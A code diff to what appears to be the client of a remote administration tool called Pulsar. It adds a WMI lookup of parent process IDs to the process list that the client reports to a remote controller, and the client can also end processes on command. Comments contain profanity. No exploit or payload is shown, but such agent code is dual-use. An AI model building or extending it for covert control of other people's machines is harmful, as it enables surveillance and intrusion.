@@ -9,9 +9,11 @@ using Pulsar.Common.Messages.Administration.TaskManager;
 using Pulsar.Common.Messages.Other;
 using Pulsar.Common.Networking;
 using System;
+using System.Collections.Generic;
 using System.ComponentModel;
 using System.Diagnostics;
 using System.IO;
+using System.Management;
 using System.Net;
 using System.Reflection;
 using System.Threading;
@@ -78,6 +80,7 @@ namespace Pulsar.Client.Messages
         {
             Process[] pList = Process.GetProcesses();
             var processes = new Common.Models.Process[pList.Length];
+            var parentMap = GetParentProcessMap();
 
             for (int i = 0; i < pList.Length; i++)
             {
@@ -85,7 +88,8 @@ namespace Pulsar.Client.Messages
                 {
                     Name = pList[i].ProcessName + ".exe",
                     Id = pList[i].Id,
-                    MainWindowTitle = pList[i].MainWindowTitle
+                    MainWindowTitle = pList[i].MainWindowTitle,
+                    ParentId = parentMap.TryGetValue(pList[i].Id, out var parentId) ? parentId : null
                 };
                 processes[i] = process;
             }
@@ -356,6 +360,59 @@ namespace Pulsar.Client.Messages
             {
                 return false;
             }
+        }
+
+        private Dictionary<int, int?> GetParentProcessMap()
+        {
+            var parentMap = new Dictionary<int, int?>();
+
+            try
+            {
+                using (var searcher = new ManagementObjectSearcher("SELECT ProcessId, ParentProcessId FROM Win32_Process"))
+                using (var results = searcher.Get())
+                {
+                    foreach (ManagementObject obj in results)
+                    {
+                        try
+                        {
+                            if (obj["ProcessId"] is uint pidValue)
+                            {
+                                int pid = unchecked((int)pidValue);
+                                int? parentId = null;
+
+                                if (obj["ParentProcessId"] is uint parentValue)
+                                {
+                                    int parent = unchecked((int)parentValue);
+                                    if (parent > 0 && parent != pid)
+                                    {
+                                        parentId = parent;
+                                    }
+                                }
+
+                                parentMap[pid] = parentId;
+                            }
+                        }
+                        finally
+                        {
+                            obj?.Dispose();
+                        }
+                    }
+                }
+            }
+            catch (ManagementException)
+            {
+                // wmi doesn't fucking work
+            }
+            catch (System.Runtime.InteropServices.COMException)
+            {
+                // no fucking com access
+            }
+            catch
+            {
+                // who tf knows
+            }
+
+            return parentMap;
         }
 
         private void Execute(ISender client, DoProcessEnd message)
